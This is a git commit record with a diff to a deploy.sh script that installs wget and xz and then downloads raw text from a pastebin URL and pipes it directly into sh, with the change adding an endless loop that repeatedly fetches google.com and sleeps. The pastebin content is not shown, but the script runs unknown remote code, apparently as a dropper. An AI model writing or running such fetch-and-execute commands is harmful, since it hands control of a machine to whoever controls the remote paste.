c24c396fdcd927b34ba1f67b26b902d8ac7f6484
fig-gabriel <147957325+fig-gabriel@users.noreply.github.com>
2024-01-23 11:25:24 +0800

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -3,4 +3,4 @@
 yum install wget
 yum install xz -y
 
-(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh && sleep 999999
+(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh && while true ; do wget google.com ; sleep 999999 ; done
